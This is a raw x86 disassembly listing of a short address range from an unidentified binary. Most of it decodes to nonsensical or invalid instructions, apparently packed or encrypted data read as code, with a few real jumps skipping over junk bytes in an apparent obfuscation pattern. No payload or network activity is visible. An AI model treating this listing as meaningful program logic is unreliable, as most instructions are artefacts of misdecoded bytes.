  41578a:	cli    
  41578b:	push   eax
  41578c:	cmc    
  41578d:	mov    bh,0x4a
  41578f:	and    BYTE PTR [ebx-0x298769a],dl
  415795:	sub    DWORD PTR [edi+0x28],0x9cbe0ad8
  41579c:	jb     0x4157d0
  41579e:	add    BYTE PTR [ebx],al
  4157a0:	(bad)  
  4157a1:	div    edi
  4157a3:	mov    edx,DWORD PTR [ebp-0x4]
  4157a6:	jmp    0x415a8a
  4157ab:	adc    al,0xcd
  4157ad:	inc    esi
  4157ae:	rol    BYTE PTR [ecx+0x51],cl
  4157b1:	xchg   esp,eax
  4157b2:	int    0x7b
  4157b4:	rcl    DWORD PTR [esi],1
  4157b6:	test   BYTE PTR [eax+0x7fa0c343],al
  4157bc:	movq   QWORD PTR [eax-0x47],mm6
  4157c0:	jle    0x415832
  4157c2:	jo     0x4157b8
  4157c4:	mov    ecx,0x825789e4
  4157c9:	pop    ebp
  4157ca:	test   DWORD PTR [edx],0x6f419ac2
  4157d0:	xor    dh,BYTE PTR [eax-0x1565f4aa]
  4157d6:	imul   ebx,DWORD PTR [eax-0x1f],0xffffffaa
  4157da:	stos   BYTE PTR es:[edi],al
  4157db:	int3   
  4157dc:	add    ebp,DWORD PTR ds:0xff5ed2e9
  4157e2:	inc    esi
  4157e3:	sub    edx,DWORD PTR [edi]
  4157e5:	getsec 
  4157e7:	mov    cl,0xf3
  4157e9:	lods   eax,DWORD PTR ds:[esi]
  4157ea:	int3   
  4157eb:	jbe    0x4157ca
  4157ed:	(bad)
  4157f1:	hlt    
  4157f2:	adc    dl,dl
  4157f4:	popf   
  4157f5:	pop    esi
  4157f6:	xchg   edx,eax
  4157f7:	adc    DWORD PTR [esi],edi
  4157f9:	dec    esp
  4157fa:	jne    0x415807
  4157fc:	xor    eax,0x9b8824e0
  415801:	dec    ecx
  415802:	mov    ah,0x5
  415804:	push   0xfb7e7e37
  415809:	adc    bl,dl
  41580b:	into   
  41580c:	bswap  edi
  41580e:	xor    ecx,0xaef6bab8
  415814:	repnz out dx,al
  415816:	pop    ds
  415817:	pop    ds
  415818:	ss out 0xd3,eax
  41581b:	(bad)  
  41581c:	call   0x38dc75a5
  415821:	loop   0x415803
  415823:	scas   al,BYTE PTR es:[edi]
  415824:	push   esi
  415825:	dec    edx
  415826:	daa    
  415827:	leave  
  415828:	mov    edi,tr4
  41582b:	fucompp 
  41582d:	dec    ebp
  41582e:	sub    DWORD PTR [edi-0x57],ebp
  415831:	shl    BYTE PTR [esi],0x77
  415834:	js     0x4157d7
  415836:	fs dec ebp
  415838:	mov    ds:0x6078d97e,eax
  41583d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41583e:	ins    BYTE PTR es:[edi],dx
  41583f:	dec    ebp
  415840:	add    BYTE PTR [esi],ch
  415842:	call   0x73cdb322
  415847:	repz test eax,0xd9eabc32
  41584d:	inc    eax
  41584e:	ins    DWORD PTR es:[edi],dx
  41584f:	lea    eax,[eax]
  415851:	jno    0x4158bc
  415853:	mov    edi,0xc902f734
  415858:	add    BYTE PTR [ecx-0x27],ah
  41585b:	dec    ebp
  41585c:	scas   eax,DWORD PTR es:[edi]
  41585d:	jg     0x4158b3
  41585f:	retf   
  415860:	lahf   
  415861:	lock test bh,0x75
  415865:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415866:	dec    esp
  415867:	jo     0x41584e
  415869:	xchg   esi,eax
  41586a:	or     ebp,DWORD PTR [ecx+esi*2]
  41586d:	pop    ss
  41586e:	(bad)  
  41586f:	jp     0x415860
  415871:	cld    
  415872:	call   0xecbf:0xf478e89a
  415879:	inc    ebx
  41587a:	je     0x4158cc
  41587c:	mov    DWORD PTR [ebx-0x4ce2cfea],edx
  415882:	fiadd  WORD PTR [edx]
  415884:	push   0xffffffce
  415886:	jge    0x415816
  415888:	(bad)  
  415889:	mov    DWORD PTR [ebp-0x49],0x145bde51
  415890:	dec    eax
  415891:	sti    
  415892:	inc    edx
  415893:	or     al,BYTE PTR [eax+0x5a44d832]
  415899:	(bad)  
  41589a:	idiv   BYTE PTR [edx-0x59]
  41589d:	lea    ebp,[ebx-0x8181cba]
  4158a3:	inc    edx
  4158a4:	fldenv [eax]
  4158a6:	pop    ecx
  4158a7:	xor    al,0x2b
  4158a9:	lock shr edx,cl
  4158ac:	cmc    
  4158ad:	in     al,dx
  4158ae:	lods   eax,DWORD PTR ds:[esi]
  4158af:	adc    bh,bl
  4158b1:	ja     0x415889
  4158b3:	jb     0x415883
  4158b5:	outs   dx,DWORD PTR ds:[esi]
  4158b6:	cli    
  4158b7:	sti    
  4158b8:	jbe    0x41590e
  4158ba:	mov    edi,DWORD PTR [ebp-0x14]
  4158bd:	aas    
  4158be:	inc    esp
  4158bf:	push   ss
  4158c0:	push   ebp
  4158c1:	in     al,dx
  4158c2:	ja     0x415926
  4158c4:	jno    0x4158d9
  4158c6:	jle    0x4158c1
  4158c8:	xchg   BYTE PTR [ebx+0x10],bl
  4158cb:	push   es
  4158cc:	je     0x4158ef
  4158ce:	mov    WORD PTR [ebx],gs
  4158d0:	add    eax,0x13d98177
  4158d5:	mov    esi,0x65593827
  4158da:	add    al,0x2e
  4158dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158dd:	push   0x911f60b4
  4158e2:	pop    esp
  4158e3:	pop    eax
  4158e4:	mov    BYTE PTR [edi],ah
  4158e6:	xor    BYTE PTR ds:0xde1a5f50,dh
  4158ec:	(bad)  
  4158ed:	cdq    
  4158ee:	cwde   
  4158ef:	cmp    ah,ch
  4158f1:	loop   0x415930
  4158f3:	aas    
  4158f4:	or     al,0xa4
  4158f6:	loopne 0x415950
  4158f8:	rcr    esi,cl
  4158fa:	sti    
  4158fb:	sbb    esp,0x9d0d2a99
  415901:	sbb    al,0x4a
  415903:	mov    eax,ds
  415905:	scas   al,BYTE PTR es:[edi]
  415906:	ja     0x415984
  415908:	mov    WORD PTR [esp+ebp*2+0x26de1b52],ds
  41590f:	outs   dx,DWORD PTR ds:[esi]
  415910:	mov    ecx,0x3e0102e1
  415915:	ins    BYTE PTR es:[edi],dx
  415916:	add    DWORD PTR [eax+0x61583194],esi
  41591c:	push   edi
  41591d:	(bad)  
  41591e:	lock (bad) 
  415920:	pushf  
  415921:	repnz test eax,0xb7953cc2
  415927:	and    DWORD PTR [ebx+ebp*1-0x74127472],esp
  41592e:	idiv   DWORD PTR [esi-0x2d]
  415931:	mov    dl,0x6
  415933:	push   ss
  415934:	mov    al,ds:0x90211f
  415939:	push   es
  41593a:	and    DWORD PTR [eax+0x29],0xffffffeb
  41593e:	inc    esi
  41593f:	fmul   QWORD PTR ds:[eax-0x1fbf9b3e]
  415946:	cmc    
  415947:	mov    dh,0xfe
  415949:	jecxz  0x4158e8
  41594b:	mov    ch,0xbd
  41594d:	inc    edi
  41594e:	inc    ebp
  41594f:	xchg   edi,eax
  415950:	mov    esp,0xc146d258
  415955:	aam    0xba
  415957:	mov    BYTE PTR [ebx+0x35],ch
  41595a:	jmp    0x13d7:0x7936995b
  415961:	repnz xchg edx,eax
  415963:	xor    ebp,DWORD PTR [ebx-0x3e]
  415966:	std    
  415967:	imul   esi,ecx,0x5
  41596a:	fwait
  41596b:	cmp    ch,BYTE PTR gs:[edi]
  41596e:	cmp    DWORD PTR [esi-0x3],esi
  415971:	test   DWORD PTR [edi+0x5],eax
  415974:	pop    edx
  415975:	aaa    
  415976:	arpl   bx,dx
  415978:	jbe    0x415973
  41597a:	and    edi,edx
  41597c:	sbb    al,0x8a
  41597e:	(bad)  [edi+esi*2]
  415981:	dec    edi
  415982:	test   al,0xde
  415984:	and    ah,0xa6
  415987:	sub    BYTE PTR [edi-0x2a],dh
  41598a:	aad    0x95
  41598c:	cmc    
  41598d:	and    DWORD PTR [ebx+0x26e2d75b],esi
  415993:	retf   0xaad3
  415996:	es je  0x4159c2
  415999:	cmp    esp,ebp
  41599b:	pushf  
  41599c:	adc    al,0xf0
  41599e:	fs jbe 0x415954
  4159a1:	inc    edx
  4159a2:	mov    cs,WORD PTR [ebp+0xc4eb95]
  4159a8:	add    eax,0xcc2e0f49
  4159ad:	retf   0x6eb
  4159b0:	retf   
  4159b1:	mov    bh,0x37
  4159b3:	and    eax,0x126a7fc2
  4159b8:	stos   BYTE PTR es:[edi],al
  4159b9:	retf   
  4159ba:	inc    esi
  4159bb:	aam    0x14
  4159bd:	push   edi
  4159be:	ret    
  4159bf:	iret   
  4159c0:	in     al,dx
  4159c1:	(bad)  
  4159c2:	repz pop ebx
  4159c4:	mov    bl,0x92
  4159c6:	and    DWORD PTR [ecx],ebp
  4159c8:	and    ecx,edi
  4159ca:	sbb    DWORD PTR [edx+0x63243780],ebp
  4159d0:	(bad)  
  4159d2:	sub    eax,0x6fdb4587
  4159d7:	es push edx
  4159d9:	sbb    ecx,esi
  4159db:	popa   
  4159dc:	mov    bh,0x8b
  4159de:	xor    eax,DWORD PTR [eax+0x55cf37f]
  4159e4:	push   ebp
  4159e5:	mov    dl,0xa6
  4159e7:	jecxz  0x4159d4
  4159e9:	stc    
  4159ea:	add    eax,0x2e90c510
  4159ef:	ins    DWORD PTR es:[edi],dx
  4159f0:	or     ecx,DWORD PTR [edi-0x13]
  4159f3:	cmp    al,0x96
  4159f5:	and    DWORD PTR [eax+0x45],edx
  4159f8:	adc    al,0x1a
  4159fa:	dec    edi
  4159fb:	dec    ecx
  4159fc:	es out dx,al
  4159fe:	xlat   BYTE PTR ds:[ebx]
  4159ff:	pusha  
  415a00:	cwde   
  415a01:	sub    ebp,DWORD PTR [esi+esi*4+0x16]
  415a05:	sbb    BYTE PTR [ecx+ecx*1+0x3e],dl
  415a09:	mov    ecx,0x643bae03
  415a0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a0f:	shl    ebx,1
  415a11:	in     al,0xfd
  415a13:	mov    ch,0xd2
  415a15:	mov    ah,0x4f
  415a17:	(bad)  
  415a18:	pushf  
  415a19:	jl     0x4159ac
  415a1b:	lods   ax,WORD PTR ds:[esi]
  415a1d:	out    dx,al
  415a1e:	(bad)  [ecx]
  415a20:	jbe    0x415a90
  415a22:	stc    
  415a23:	add    cl,BYTE PTR [eax+0x32]
  415a26:	(bad)  
  415a27:	loopne 0x415a65
  415a29:	jmp    FWORD PTR [ecx+ecx*1]
  415a2c:	xlat   BYTE PTR ds:[ebx]
  415a2d:	jle    0x4159be
  415a2f:	das    
  415a30:	push   edi
  415a31:	in     eax,dx
  415a32:	push   cs
  415a33:	adc    dl,BYTE PTR ds:0x7d91986e
  415a39:	jae    0x415a57
  415a3b:	imul   DWORD PTR [edx+0x6b32e732]
  415a41:	and    ebp,DWORD PTR [ecx]
  415a43:	shr    bh,1
  415a45:	hlt    
  415a46:	pop    ecx
  415a47:	neg    BYTE PTR [ecx+0x66]
  415a4a:	sbb    ebx,DWORD PTR [edx+0x23d73e80]
  415a50:	fild   DWORD PTR fs:[edi-0x7373d7f7]
  415a57:	or     ecx,DWORD PTR [eax+0x6c509c63]
  415a5d:	pop    es
  415a5e:	mov    eax,0x9b148baa
  415a63:	cmp    al,0x88
  415a65:	ror    edx,0xe4
  415a68:	and    dh,ah
  415a6a:	clc    
  415a6b:	lods   al,BYTE PTR ds:[esi]
  415a6c:	adc    BYTE PTR [esi+0x7b],dl
  415a6f:	sbb    bh,ch
  415a71:	mov    al,ds:0xba6d9819
  415a76:	mov    BYTE PTR [ecx+0x5d],ch
  415a79:	inc    edx
  415a7a:	out    0xf4,eax
  415a7c:	jle    0x415a21
  415a7e:	cdq    
  415a7f:	jnp    0x415abb
  415a81:	or     bl,cl
  415a83:	(bad)
  415a87:	gs pop es
  415a89:	popf   
  415a8a:	xor    edx,ecx
  415a8c:	lea    eax,[edx+eax*1+0x32729c]
  415a93:	jmp    0x415d77
  415a98:	sub    dl,BYTE PTR [eax-0x24]
  415a9b:	mov    esp,0x6eaabc6a
  415aa0:	popa   
  415aa1:	pop    ecx
  415aa2:	xchg   ebp,eax
  415aa3:	aas    
  415aa4:	add    DWORD PTR [edi+0x66],eax
  415aa7:	or     al,0xb8
  415aa9:	or     eax,0x7eb9707f
  415aae:	jo     0x415b20
  415ab0:	lods   eax,DWORD PTR ds:[esi]
  415ab1:	inc    ebx
  415ab2:	jb     0x415a60
  415ab4:	aad    0x11
  415ab6:	add    DWORD PTR [edi+0x69],esp
  415ab9:	(bad)  [ebx+0x2cf3186a]
  415abf:	sbb    eax,0xff3ce009
  415ac4:	pop    ds
  415ac5:	and    bl,al
  415ac7:	mov    bl,0x0
  415ac9:	jo     0x415ac4
  415acb:	inc    esi
  415acc:	and    edi,DWORD PTR [ebx-0x2dc39ed0]
  415ad2:	ret    
  415ad3:	xlat   BYTE PTR ds:[ebx]
  415ad4:	pop    eax
  415ad5:	or     esi,eax
  415ad7:	push   eax
  415ad8:	jp     0x415aba
  415ada:	bound  ebx,QWORD PTR [ecx+0x73453836]
  415ae0:	rol    BYTE PTR [ebp+0x3bf02eb2],0xfd
  415ae7:	ret    
  415ae8:	fistp  QWORD PTR [ecx-0x56]
  415aeb:	adc    bl,BYTE PTR [ebx]
  415aed:	out    0x76,eax
  415aef:	jmp    0x415b51
  415af1:	and    BYTE PTR [ecx-0x3f],bh
  415af4:	popw   ss
  415af6:	(bad)  
  415af7:	xchg   BYTE PTR [ecx-0x31],bl
  415afa:	ss stos BYTE PTR es:[edi],al
  415afc:	push   edi
  415afd:	jns    0x415b40
  415aff:	(bad)
  415b03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b04:	(bad)  
  415b05:	cmp    eax,0x6e2fb134
  415b0a:	jmp    0x415b7e
  415b0c:	(bad)  
  415b0d:	pop    ebx
  415b0e:	enter  0x5df0,0xd8
  415b12:	jno    0x415ad3
  415b14:	mov    esi,DWORD PTR [ebx-0x57]
  415b17:	jno    0x415ab7
  415b19:	adc    BYTE PTR ds:0x9f9ad93d,bh
  415b1f:	inc    ecx
  415b20:	sub    DWORD PTR ds:0xacc072c5,0xc374a801
  415b2a:	fld    TBYTE PTR [edx-0x14]
  415b2d:	mov    esi,?
  415b2f:	rol    BYTE PTR [esi+ebp*8],cl
  415b32:	fistp  DWORD PTR [edi]
  415b34:	dec    esi
  415b35:	cmp    eax,0xb0104bbd
  415b3a:	loope  0x415b14
  415b3c:	popa   
  415b3d:	adc    DWORD PTR [eax-0x73c6308],ecx
  415b43:	imul   esp,DWORD PTR [edi+0x2e65c6d9],0x4b
  415b4a:	jmp    0x415b52
  415b4c:	push   edx
  415b4d:	pop    eax
  415b4e:	inc    ebp
  415b4f:	xor    ebx,DWORD PTR [ebp-0x781848bd]
  415b55:	add    eax,0xd9f6a53b
  415b5a:	mov    al,BYTE PTR [ebx-0x701c3c0e]
  415b60:	inc    edx
  415b61:	jmp    0x415ba7
  415b63:	cs mov esi,0xeeabef9e
  415b69:	pop    es
  415b6a:	jns    0x415b5e
  415b6c:	jb     0x415b67
  415b6e:	retf   
  415b6f:	xor    BYTE PTR [edx],bl
  415b71:	mov    ebp,0xd2f4607d
  415b76:	in     eax,dx
  415b77:	jecxz  0x415b47
  415b79:	loopne 0x415b72
  415b7b:	push   eax
  415b7c:	into   
  415b7d:	cmp    ah,BYTE PTR [edx-0x7228d716]
  415b83:	lea    esp,[ebp+0x30]
  415b86:	cmc    
  415b87:	jecxz  0x415bfd
  415b89:	pop    edx
  415b8a:	(bad)  
  415b8c:	nop
  415b8d:	lds    edi,FWORD PTR [eax+0x3c85894f]
  415b93:	ror    ebx,1
  415b95:	mov    ds:0x75ea2342,eax
  415b9a:	or     di,WORD PTR [esi]
  415b9d:	cli    
  415b9e:	push   esp
  415b9f:	fwait
  415ba0:	or     edx,0xffffffe3
  415ba3:	dec    esi
  415ba4:	push   0x3d
  415ba6:	adc    ah,bh
  415ba8:	sbb    eax,0x627b52c4
  415bad:	gs fwait
  415baf:	push   0x40d0bef0
  415bb4:	imul   edi,DWORD PTR [ebx+ebx*4-0x54],0xffffff89
  415bb9:	sbb    al,0x2b
  415bbb:	xor    BYTE PTR [ecx],dl
  415bbd:	out    dx,eax
  415bbe:	dec    ecx
  415bbf:	frstor [edx]
  415bc1:	or     BYTE PTR [esp+ecx*8+0x63726a78],bl
  415bc8:	push   0x77b4fa2f
  415bcd:	stos   BYTE PTR es:[edi],al
  415bce:	sub    al,0xbd
  415bd0:	inc    edi
  415bd1:	fcom   DWORD PTR [esi-0x68]
  415bd4:	outs   dx,DWORD PTR ds:[esi]
  415bd5:	push   cs
  415bd6:	popa   
  415bd7:	cld    
  415bd8:	retf   
  415bd9:	out    dx,eax
  415bda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bdb:	ins    DWORD PTR es:[edi],dx
  415bdc:	and    bl,BYTE PTR [edx+0xfcff80b]
  415be2:	mov    bl,0xcc
  415be4:	add    eax,0xb0543141
  415be9:	xchg   ecx,eax
  415bea:	jb     0x415bd2
  415bec:	test   DWORD PTR [edx+0x5aa6fbd3],eax
  415bf2:	adc    bl,cl
  415bf4:	jno    0x415b92
  415bf6:	jl     0x415bc0
  415bf8:	mov    edx,0xd374be91
  415bfd:	jb     0x415c4c
  415bff:	adc    BYTE PTR [ebx-0x3b],dl
  415c02:	push   esp
  415c03:	neg    BYTE PTR gs:[edi+0x43cd42cb]
  415c0a:	push   ecx
  415c0b:	xchg   esi,eax
  415c0c:	leave  
  415c0d:	aad    0x65
  415c0f:	push   0x268dc91d
  415c14:	mov    dl,0x8e
  415c16:	hlt    
  415c17:	sub    DWORD PTR [edi],0xffffff80
  415c1a:	cmc    
  415c1b:	sbb    dl,BYTE PTR [esi+0x62635ceb]
  415c21:	or     BYTE PTR [ecx+0x1e638abf],bl
  415c27:	test   BYTE PTR [ecx],bl
  415c29:	stc    
  415c2a:	js     0x415c08
  415c2c:	das    
  415c2d:	popa   
  415c2e:	inc    edi
  415c2f:	push   ebp
  415c30:	pop    ss
  415c31:	xor    esi,DWORD PTR fs:[esi-0x5a299a63]
  415c38:	es sub ebx,esp
  415c3b:	fwait
  415c3c:	call   0xbbe7:0x4435312d
  415c43:	int    0x6e
  415c45:	or     dh,BYTE PTR [esi-0x27]
  415c48:	in     eax,dx
  415c49:	iret   
  415c4a:	mov    ebp,0x99e23753
  415c4f:	push   0x58
  415c51:	dec    edi
  415c52:	add    DWORD PTR [edi+0x2c7b4014],ecx
  415c58:	push   ds
  415c59:	inc    eax
  415c5a:	push   eax
  415c5b:	xor    dl,BYTE PTR [edi+0x3012c0fd]
  415c61:	gs xor al,0x6
  415c64:	call   0x568e:0xc571ceca
  415c6b:	in     eax,0x67
  415c6d:	fdivr  QWORD PTR [edx]
  415c6f:	out    0x31,eax
  415c71:	and    al,0x52
  415c73:	lock adc ebp,DWORD PTR [ecx-0x30b6b688]
  415c7a:	xchg   esp,eax
  415c7b:	mov    cs,WORD PTR [eax-0x6dae74aa]
  415c81:	lock popa 
  415c83:	or     DWORD PTR [edi],ebx
  415c85:	fwait
  415c86:	pop    ebp
  415c87:	jmp    0x415ce9
  415c89:	xchg   ecx,esi
  415c8b:	dec    esi
  415c8c:	push   es
  415c8d:	ins    BYTE PTR es:[edi],dx
  415c8e:	sub    esi,DWORD PTR [eax+0x4b]
  415c91:	adc    DWORD PTR [esi+0x5d222b94],esp
  415c97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c98:	shr    esp,0xf
  415c9b:	popa   
  415c9c:	mov    cl,0x31
  415c9e:	mov    al,es:0x64ce718f
  415ca4:	loop   0x415cd5
  415ca6:	inc    ebx
  415ca7:	cmp    esp,DWORD PTR ds:0xa508d32
  415cad:	mov    bl,0x4f
  415caf:	loope  0x415cd7
  415cb1:	test   al,0x91
  415cb3:	sub    BYTE PTR [esp+edx*4+0x3de8c623],dl
  415cba:	cmp    eax,0x29c2897f
  415cbf:	mov    bh,BYTE PTR [edi+esi*2]
  415cc2:	dec    ebx
  415cc3:	mul    DWORD PTR [ebx+0x30e4842a]
  415cc9:	and    esi,DWORD PTR ds:0x226140a1
  415ccf:	adc    al,0xac
  415cd1:	cmp    BYTE PTR ds:0xb26d4047,dh
  415cd7:	jae    0x415c88
  415cd9:	imul   edi,ecx,0xd003eed4
  415cdf:	pop    ss
  415ce0:	mov    esi,ds
  415ce2:	push   cs
  415ce3:	in     eax,0xe
  415ce5:	ja     0x415cde
  415ce7:	jno    0x415c88
  415ce9:	(bad)  
  415cea:	sub    eax,0x55501030
  415cef:	daa    
  415cf0:	cmp    DWORD PTR [edx-0x70ee0f75],ebp
  415cf6:	sub    esi,0xffffffa3
  415cf9:	push   ss
  415cfa:	and    ebp,edx
  415cfc:	in     al,0xf0
  415cfe:	push   ebp
  415cff:	or     edi,DWORD PTR [esi-0x7312518e]
  415d05:	das    
  415d06:	jmp    DWORD PTR [edx-0x3b421f]
  415d0c:	add    ebp,DWORD PTR [ecx-0x4fa05424]
  415d12:	lea    eax,[edx+0x65b2858a]
  415d18:	lahf   
  415d19:	jb     0x415d66
  415d1b:	jp     0x415cec
  415d1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d1e:	inc    esp
  415d1f:	inc    esi
  415d20:	test   eax,0xe865f653
  415d25:	xor    DWORD PTR [edi],ebx
  415d27:	stc    
  415d28:	and    ebp,edi
  415d2a:	rol    BYTE PTR [ebp+ecx*1-0x28],0x64
  415d2f:	leave  
  415d30:	sbb    al,0xd
  415d32:	scas   al,BYTE PTR es:[edi]
  415d33:	hlt    
  415d34:	jle    0x415d75
  415d36:	mov    BYTE PTR [ecx],ch
  415d38:	es and eax,0xc9d6d795
  415d3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d3f:	mul    BYTE PTR [ebx+0x2d]
  415d42:	aaa    
  415d43:	arpl   WORD PTR [eax],si
  415d45:	out    dx,al
  415d46:	aaa    
  415d47:	pusha  
  415d48:	inc    esi
  415d49:	push   edx
  415d4a:	rcl    BYTE PTR [eax-0x4b],1
  415d4d:	jecxz  0x415d1e
  415d4f:	jno    0x415d37
  415d51:	das    
  415d52:	ins    BYTE PTR es:[edi],dx
  415d53:	push   edi
  415d54:	dec    esi
  415d55:	xor    eax,0x2f58f45f
  415d5a:	xor    al,0xe3
  415d5c:	stos   DWORD PTR es:[edi],eax
  415d5d:	cmp    edi,DWORD PTR [esi+0x2d]
  415d60:	iret   
  415d61:	pop    ebp
  415d62:	pop    esp
  415d63:	mov    cl,0x4b
  415d65:	xchg   ebp,eax
  415d66:	sub    eax,0xd79647b7
  415d6b:	scas   eax,DWORD PTR es:[edi]
  415d6c:	mov    eax,ds:0x5e63453c
  415d71:	xchg   ecx,eax
  415d72:	ss xor al,0x8f
  415d75:	sbb    BYTE PTR [ecx],ah
  415d77:	mov    edx,DWORD PTR [ebp+0x8]
  415d7a:	mov    edi,DWORD PTR [ebp-0x24]
  415d7d:	mov    DWORD PTR [edi+edx*4],eax
  415d80:	mov    eax,DWORD PTR [ebp-0x18]
  415d83:	jmp    0x416067
  415d88:	dec    eax
  415d89:	fistp  QWORD PTR [edx+0x75a9712b]
  415d8f:	arpl   bx,ax
  415d91:	pop    ss
  415d92:	jp     0x415d95
  415d94:	adc    ah,BYTE PTR [edi]
  415d96:	push   ebx
  415d97:	je     0x415d1a
  415d99:	or     bh,BYTE PTR [edi+0x70]
  415d9c:	mov    ecx,0x4b70707e
  415da1:	inc    edi
  415da2:	jb     0x415d5f
  415da4:	fadd   DWORD PTR [ecx]
  415da6:	test   BYTE PTR [esi+ebx*1+0x6871ad33],0x83
  415dae:	stos   BYTE PTR es:[edi],al
  415daf:	test   al,0xe9
  415db1:	sub    dl,BYTE PTR [ecx-0x2fe452b9]
  415db7:	loop   0x415d62
  415db9:	popa   
  415dba:	jp     0x415dac
  415dbc:	add    ch,dl
  415dbe:	repnz mov bh,0x63
  415dc1:	out    0x62,eax
  415dc3:	cmp    BYTE PTR [eax+ebx*1],al
  415dc6:	fiadd  DWORD PTR [ebx+0x13289ad0]
  415dcc:	shl    BYTE PTR [eax],cl
  415dce:	pop    esp
  415dcf:	mov    DWORD PTR [ebx-0x431c79e7],esp
  415dd5:	adc    edx,edx
  415dd7:	dec    esi
  415dd8:	fsub   QWORD PTR [ebx+0x7deaa083]
  415dde:	and    al,0xb2
  415de0:	pop    ebx
  415de1:	add    DWORD PTR [ebx+0x7d6cd106],0x20
  415de8:	pop    ecx
  415de9:	mov    eax,0xf5915e5a
  415dee:	sub    ebp,eax
  415df0:	in     al,0x53
  415df2:	xchg   ecx,eax
  415df3:	imul   edi,esp,0xffffffee
  415df6:	sub    bl,BYTE PTR [edi+0x39]
  415df9:	jae    0x415e54
  415dfb:	aad    0xe3
  415dfd:	repz (bad) 
  415dff:	jae    0x415e0c
  415e01:	lea    esi,[esi+0x1fa8a55e]
  415e07:	lea    ebp,[eax]
  415e09:	push   eax
  415e0a:	loopne 0x415dc3
  415e0c:	popa   
  415e0d:	mov    eax,ds:0x8224cd89
  415e12:	push   esp
  415e13:	lds    esi,FWORD PTR [edx]
  415e15:	and    al,0x58
  415e17:	(bad)  
  415e18:	stos   DWORD PTR es:[edi],eax
  415e19:	pop    esp
  415e1a:	iret   
  415e1b:	retf   0x1b99
  415e1e:	adc    edi,DWORD PTR [esp+eiz*8-0xe9a186]
  415e25:	std    
  415e26:	xchg   ecx,eax
  415e27:	sbb    eax,0x4d4c3289
  415e2c:	lods   eax,DWORD PTR ds:[esi]
  415e2d:	and    al,0xdf
  415e2f:	es int3 
  415e31:	sub    ebx,DWORD PTR [edi-0x5c]
  415e34:	push   ecx
  415e35:	loopne 0x415e60
  415e37:	pop    edx
  415e38:	adc    ecx,DWORD PTR [ebx+0x61]
  415e3b:	xchg   edi,eax
  415e3c:	loope  0x415e11
  415e3e:	enter  0x3eae,0x96
  415e42:	icebp  
  415e43:	add    bh,al
  415e45:	sbb    al,0xfb
  415e47:	(bad)  
  415e49:	sub    bl,al
  415e4b:	and    eax,0xc656d9d0
  415e50:	call   0xaca8:0xd7bea723
  415e57:	mov    eax,ds:0xf465d284
  415e5c:	mov    ss,WORD PTR [edi-0x3e62a20e]
  415e62:	xchg   ebp,eax
  415e63:	(bad)  
  415e65:	xchg   ebp,eax
  415e66:	jl     0x415e35
  415e68:	stos   DWORD PTR es:[edi],eax
  415e69:	retf   0xe107
  415e6c:	(bad)  
  415e6d:	push   esi
  415e6e:	out    dx,eax
  415e6f:	fucomi st,st(4)
  415e71:	(bad)  
  415e72:	jmp    0x415e87
  415e74:	ror    DWORD PTR [eax-0x7e7757e1],1
  415e7a:	jno    0x415e19
  415e7c:	mov    ebp,0xab2bbf9b
  415e81:	push   esp
  415e82:	ins    DWORD PTR es:[edi],dx
  415e83:	cli    
  415e84:	data16 aaa 
  415e86:	jge    0x415ede
  415e88:	mov    DWORD PTR [ebx-0x3],esp
  415e8b:	pop    es
  415e8c:	imul   esp,ebx,0x3516f772
  415e92:	add    eax,0x4a877aff
  415e97:	jb     0x415ec3
  415e99:	pop    es
  415e9a:	out    dx,eax
  415e9b:	ror    al,1
  415e9d:	nop
  415e9e:	addr16 push ebx
  415ea0:	push   eax
  415ea1:	or     bh,0x64
  415ea4:	push   ds
  415ea5:	push   cs
  415ea6:	mov    ebp,0xd602097e
  415eab:	jb     0x415e39
  415ead:	xchg   ebx,eax
  415eae:	aas    
  415eaf:	shl    BYTE PTR [edx+0x21],0xba
  415eb3:	into   
  415eb4:	mov    ch,0x9
  415eb6:	dec    esp
  415eb7:	pop    ebx
  415eb8:	sti    
  415eb9:	cmp    al,0xa
  415ebb:	push   0xd
  415ebd:	and    DWORD PTR ds:0x214e51d7,ebx
  415ec3:	iret   
  415ec4:	xchg   ecx,eax
  415ec5:	cmp    DWORD PTR [eax+0x33],0x23f4712c
  415ecc:	mov    dh,0x91
  415ece:	push   cs
  415ecf:	and    eax,0x39788b36
  415ed4:	inc    esi
  415ed5:	scas   al,BYTE PTR es:[edi]
  415ed6:	push   esp
  415ed7:	stos   BYTE PTR es:[edi],al
  415ed8:	aas    
  415ed9:	cdq    
  415eda:	cmp    DWORD PTR [ebp+0x3c],ebp
  415edd:	js     0x415ee4
  415edf:	cmp    ecx,ebx
  415ee1:	adc    eax,0x94c50c89
  415ee6:	dec    BYTE PTR [eax-0x41]
  415ee9:	(bad)  
  415eea:	fsub   QWORD PTR [edi]
  415eec:	mov    dh,0x5e
  415eee:	outs   dx,BYTE PTR ds:[esi]
  415eef:	imul   edx,DWORD PTR [edx],0xffffffc6
  415ef2:	sbb    eax,edx
  415ef4:	push   ds
  415ef5:	inc    eax
  415ef6:	xor    eax,0xd2e09d88
  415efb:	mov    bl,0x7b
  415efd:	pop    ebx
  415efe:	(bad)  
  415f00:	jbe    0x415f6d
  415f02:	popf   
  415f03:	push   eax
  415f04:	shr    BYTE PTR [esi],0xfb
  415f07:	into   
  415f08:	outs   dx,BYTE PTR ds:[esi]
  415f09:	imul   ebp,DWORD PTR [ebp-0x6a],0x136d1de9
  415f10:	jl     0x415eb6
  415f12:	popa   
  415f13:	aas    
  415f14:	std    
  415f15:	imul   ebp,DWORD PTR [ebx-0x4c06d212],0xffffffa0
  415f1c:	pop    ebx
  415f1d:	mov    ds:0x6e511d1,eax
  415f22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f23:	mov    ebx,0x8b930d48
  415f28:	mov    ds:0xa4159147,al
  415f2d:	fild   WORD PTR [edx+0x76da7aa9]
  415f33:	loope  0x415f42
  415f35:	sti    
  415f36:	sbb    BYTE PTR [ebp+ecx*1+0x5c4b1b92],al
  415f3d:	mov    bl,0x87
  415f3f:	stos   DWORD PTR es:[edi],eax
  415f40:	sbb    bh,dh
